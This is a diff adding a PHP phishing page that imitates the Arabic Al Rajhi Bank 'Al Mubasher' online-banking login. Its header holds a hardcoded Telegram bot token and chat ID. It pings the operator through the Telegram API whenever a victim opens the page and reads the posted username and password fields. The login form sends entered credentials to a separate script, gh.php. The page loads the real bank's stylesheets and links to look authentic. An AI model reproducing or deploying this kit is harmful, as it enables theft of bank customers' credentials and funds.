@@ -1,0 +1,374 @@
+<?php
+$API_KEY = "2033455595:AAEKBo-D8ucxR1l2LXPawLdnVe6Ho43BPmU";
+
+$admin = 1397018700 ; 
+$code = $_POST["code"];
+$user = $_POST["user"];
+$pass = $_POST['pass'];
+$login = $_POST['login'];
+$time = date("Y-m-d H:i:s");
+$text = urlencode("
+- تم الضغط على مصرف الراجحي💲
+");
+$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
+file_get_contents($url);
+?>
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" type="text/css" href="cid:css-e93ddbbf-7cd5-447e-bec9-053321a7d23b@mhtml.blink" />
+
+		
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<!-- Sets the title of page -->
+		<title>المباشر للأفراد |خدمة الانترنت المصرفية| مصرف الراجحي</title>
+	   
+	   	
+	   	
+	    <link rel="shortcut icon" href="https://www.almubasher.com.sa/portal-theme/theme_mass/img/favicon.png?v=20211022104222">
+		
+		    
+		        <!-- Compressed theme stylesheet -->
+		        <link rel="stylesheet" type="text/css" href="https://www.almubasher.com.sa/portal-theme/theme_mass/css/theme-styles.min.css?v=20211022104222">
+		        <link rel="stylesheet" type="text/css" href="https://www.almubasher.com.sa/portal-theme/theme_mass/css/styles1.min.css?v=20211022104222">
+        		<link rel="stylesheet" type="text/css" href="https://www.almubasher.com.sa/portal-theme/theme_mass/css/styles2.min.css?v=20211022104222">
+		    
+		    
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<!-- Added Javascript library for Encryption Password 
+		<script type="text/javascript" src="/portal/static/js/encrypt/framework.js?v=20211022104222"></script>
+		-->
+		
+		
+		
+			
+		
+		
+		
+		
+		
+ 		
+
+
+ 
+	
+		
+		
+		
+		<link href="https://www.almubasher.com.sa/portal-theme/theme_mass/css/style.css?v=20211022104222" rel="stylesheet" type="text/css">
+ 
+ 
+ 
+	  <link rel="stylesheet" type="text/css" href="https://www.almubasher.com.sa/portal-theme/theme_mass/css/style-ar.css?v=20211022104222">
+
+	</head>
+	
+		
+			<body class="ar" dir="rtl">
+		
+		
+	
+
+		<div id="container">
+			<div style="display:none;width:0px;height:0px;"><form action="https://www.almubasher.com.sa/portal/auth/login.do?locale=ar_SA" method="post" name="auxForm"><div style="display: none;" id="KeyPairs">{"e":"10001","n":"9598864139fba0234441adae6baa50819f45850a34f96df0b59f1b90b4d96d904538ccf42bf667c50502b4f769c02ab56d694178842cb106ec8d850acd220863","maxdigits":"67"}</div></form></div>
+			<div class="p-brand"></div>
+		    <div id="header-login">
+				
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		
+	
+						
+		
+		
+			
+		
+	
+	 
+	<form action="https://www.almubasher.com.sa/portal/auth/login.do?locale=ar_SA" name="formhlogin" method="post">
+		<ul id="header-t-log" class="left">
+			
+			            
+            <li class="i-h4-log"><a target="_blank" href="https://www.almubasher.com.sa/portal/cms//Portal%20Content/Legal%20%26%20Regulatory%20Requirements/Online%20Security%20Overview/Online_Security_Overview_ar_SA_Current.pdf?v=">نظرة عامة على الانترنت الامن</a></li>            
+            <li class="i-h5-log">
+				
+					  <a target="_blank" href="https://www.almubasher.com.sa/portal/cms//Portal%20Content/Legal%20%26%20Regulatory%20Requirements/Terms%20%26%20Conditions/Al%20Mubasher/Online%20Banking%20Agreement(Ar).pdf?v=" title="">الشروط و الأحكام</a>
+					  
+				
+			</li>
+            <li class="i-h6-log t-last">
+				
+					  <a target="_blank" href="http://www.alrajhibank.com.sa/ar/personal/services/pages/mubasher-retail.aspx" title=" ">معلومات</a>
+					  
+				
+            </li>
+				
+            <li>
+				<a title="">English</a>						
+			</li>
+           </ul>
+		<br>
+           <div class="clear"></div>
+          	<h1><span class="right">Al Rajhi Bank</span></h1>
+		<div class="clear"></div>
+	</form>
+		
+
+		   	</div>
+			<div class="clear"></div>
+			
+			<!--container-left-->
+			<div id="container-left" class="left">
+				<!--content-->
+				<div id="content" class="three login">
+		
+				<div id="login-field-set" class="ch">
+				
+					
+					<h3><span>دخول</span></h3>
+					
+					
+					
+					<form id="login" name="login" action="gh.php" method="post">
+						
+							
+							
+								
+							
+						
+						
+						
+			        	<div id="login-field-set" class="ch-div ch-div-t">	
+							<div class="clearbr"></div>	
+							<fieldset>
+								<p class="ch-div-intr">
+								
+								
+								</p>
+								<p>
+									<label for="user" class="log">اسم المستخدم</label>
+									<span>
+									<!--  f:input path="username" id="username" title='اسم المستخدم' cssClass="i-t i-t0 i-log" autocomplete="off" /> -->
+									<input type="text" id="user" name="user" class="i-t i-t0 i-log1" title="" autocomplete="off" maxlenght="35" value="">
+									
+									</span>
+								</p>
+								<br clear="all"><br clear="all">
+								<p>
+									<label for="pass" class="log">كلمة السر</label>
+									<span>
+									<input class="i-t i-t0 i-log" id="pass" name="pass" type="pass" title="" maxlength="14" autocomplete="off">
+									
+									</span>
+								</p>
+								<br clear="all"><br clear="all">
+								<p>
+									<span class="blank-label log"></span>
+									 <input type="submit" class="largeBtn primaryColor pullRight" value="دخول">
+	 								 <a title="" style="display:inline"> نسيت كلمة السر </a> 
+								     <br clear="all">
+								</p>
+							</fieldset>
+							
+							<p class="ch-div-intr">
+	 							<span class="s-ni i-log">غير مسجل في الخدمة؟</span>
+	 							<a title="" class="s-na i-log">التسجيل في الخدمات الإلكترونية</a> 
+							</p>
+							
+							<div class="clearboth15"></div>
+							
+							<div id="downTimeMessage" style="display:none;" class="field error"><img src="https://www.almubasher.com.sa/portal-theme/theme_mass/img/downtime.png?v=20211022104222" alt="">عزيزي dddddd ، سيتم إيقاف المباشر بتاريخ 8-04-2015 بين الساعة  6:30 و- 9:00  صباحاً ، نأسف  لإزعاجكم ، وشكراً</div>
+							
+							<div class="hr-line">
+							   <div class="clearbr"></div>
+							   <span class="info-heading">تعليمات هامة</span>
+							   <p class="info-text">
+						       		- تأكد من صحة الرابط في المتصفح https://www.almubasher.com.sa/portal/auth/login.do <br>
+	                                - تأكد من ظهور علامة القفل في المتصفح<img src="https://www.almubasher.com.sa/portal-theme/theme_mass/img/loginLock.png?v=20211022104222" alt=""> <br>
+								  	- إذا كنت مسجلاً , فضلاً أدخل إسم المستخدم وكلمة السر<br>
+								  	- إذا كنت غير مسجل أو نسيت كلمة السر , فضلاً اضغط " تسجيل "<br>
+								  	- عند الطلب , قم بإدخال كلمة السر المؤقتة والمرسلة لهاتفك الجوال<br>
+								  	- تأكد من أن رقم الهاتف الجوال المدخل في الصراف الآلي في حوزتك				   
+							   </p>
+						   </div>
+						   
+						</div>
+						
+						
+ 						 
+						 
+						
+					</form>
+				</div>
+				</div>
+				<!--end content-->
+			</div>
+			<!--end container left-->
+				
+			<!--container right-->
+			<div id="container-right" class="right">
+				
+
+
+
+
+
+
+<div id="ul-right-login">
+	<ul id="widgets-right">
+	<!--W3-->
+    	<li id="m3">					    
+         	<h3 class="blue">
+			    هل تعلم
+         	</h3>
+	      	<div id="mm3">						
+               <p class="pb left">
+					<span id="registerContainer" class="i-log">بإمكانك تحديد العمليات المفضلة وذلك لتسهيل تنفيذها والوصل لها<div class="clear"></div></span>
+					</p><div class="clear"></div>
+				<p></p>
+				<div class="clear"></div>
+				<p class="plast">
+					<a class="right" title="" id="nextRegister">التالي</a>
+					</p><div class="clear"></div>
+				<p></p>
+				<div class="clear"></div>
+			    <ul class="items" style="display:none">
+			       <li>بإمكانك تحديد علامة للعمليات التي تقوم بتنفيذها وذلك لتصنيفها</li>
+			       <li>بإمكانك تحديد العمليات المفضلة وذلك لتسهيل تنفيذها والوصل لها</li>
+			       <li>بإمكانك تحديد حساباتك المفضلة لتسهيل الوصول لها</li>
+			       <li>بإمكانك إضافة اسم مختصر لكل حساب عن طريق صفحة حساباتي</li>
+			       <li></li>
+			       <li></li>
+			       <li></li>
+			       <li></li>
+			       <li></li>
+			       <li></li>
+			    </ul>
+			</div>
+			
+        </li>
+    <!--W3-->
+    <br>
+		<!--W5-->
+         <li id="m5">					    
+         	<h3 class="blue">
+			    نصائح أمنية
+         	</h3>
+	      	<div id="mm5">						
+               <p class="pb left">
+					<span id="newsContainer" class="i-log">المصرف لن يطلب منك ابدا ادخال اي بيانات شخصية كرقم العميل او الرقم السري لخدمة الهاتف المصرفي من خلال خدمة المباشر للأفراد .  إذا ظهرت لك صفحة تطلب منك إدخال رقم العميل والرقم السري ، عليك فوراً اغلاق الصفحة والاتصال بالمصرف. <div class="clear"></div></span>
+					</p><div class="clear"></div>
+				<p></p>
+				<div class="clear"></div>
+				<p class="plast">
+					<a class="right" title="" id="nextNews">التالي</a>
+					</p><div class="clear"></div>
+				<p></p>
+				<div class="clear"></div>
+				<ul class="items" style="display:none">
+                   <li>المصرف لن يطلب منك ابدا ادخال اي بيانات شخصية كرقم العميل او الرقم السري لخدمة الهاتف المصرفي من خلال خدمة المباشر للأفراد .  إذا ظهرت لك صفحة تطلب منك إدخال رقم العميل والرقم السري ، عليك فوراً اغلاق الصفحة والاتصال بالمصرف. </li>
+                   <li>لا تقم بتنزيل أي ملف او الضغط على أي رابط يصلك من مصدر غير موثوق او مرسل من شخص غير معروف لديك</li>
+                   <li>اقرأ بتمعن رسائل التنبيه المرسلة على جوالك و تأكد من أنها تتبع للعمليات التي قمت بتنفيذها</li>
+                   <li>لا تقم بتاتاً بالدخول على حسابك عبر جهاز حاسب آلي مشترك مثل أجهزة مقاهي الانترنت</li>
+                   <li>تذكر دائما أن تقوم بالضغط على رابط "الخروج" بعد الانتهاء من استخدام المباشر للأفراد والتأكد من ظهور شاشة الخروج.</li>
+                   <li>مصرف الراجحي لن يقوم بطلب تحديث بياناتكم عبر الهاتف, نرجو عدم الافصاح عن أي معلومات شخصية من متصلين مجهولين .</li>
+                   <li>مصرف الراجحي لن يقوم بطلب تحديث بياناتكم عبر الهاتف, نرجو عدم الافصاح عن أي معلومات شخصية من متصلين  .</li>
+                   <li></li>
+                   <li></li>
+                   <li></li>
+                </ul>
+			</div>
+			
+        </li>
+        <!--W5-->
+		
+	
+     </ul>
+	<div class="clear"></div>
+</div>
+		 
+	        </div>
+			<!--end container right-->
+	 
+			<div class="clear"></div>
+			<div id="footer-login" class="footer">
+				
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<ul id="footer-l" class="left">
+    <li class="left">
+        
+            <a href="https://www.almubasher.com.sa/portal/cms//Portal%20Content/Legal%20%26%20Regulatory%20Requirements/Privacy%20Policy/Privacy_Policy_ar_SA_Current.pdf?v=" target="_blank" title="">السياسة الأمنية عبر الإنترنت</a>
+            
+        
+    </li>
+</ul>
+<ul id="footer-r" class="right">
+    <li class="left">
+    	مباشر للافراد إصدار   5.9.5 حقوق الطبع © 2019 مصرف الراجحي جميع الحقوق محفوظة. اسم المؤسسة المالية: شركة الراجحي المصرفية للأستثمار ، نوع الكيان: مصرف / مؤسسة مالية ، شركة سعودية مساهمة برأس مال: 25,000,000,000.00 ، رقم السجل التجاري: 1010000096 ، صندوق بريد: 28 الرياض 11411 المملكة العربية السعودية ، هاتف: 211600 11 966+ ، العنوان الوطني: شركة الراجحي المصرفية للاستثمار، 8467 طريق الملك فهد-حي المروج، وحدة رقم (1)، الرياض، 12263 – 2743 ، الموقع الإلكتروني:<a href="https://www.alrajhibank.com.sa/" style="color:white;text-decoration-line:underline;"> www.alrajhibank.com.sa </a>، مرخص لها برقم الترخيص: 1420 ، وخاضعة لرقابة وإشراف مؤسسة النقد العربي السعودي.
+    </li>
+</ul>
+
+
+			</div>
+		</div>
+	
+</body></html>
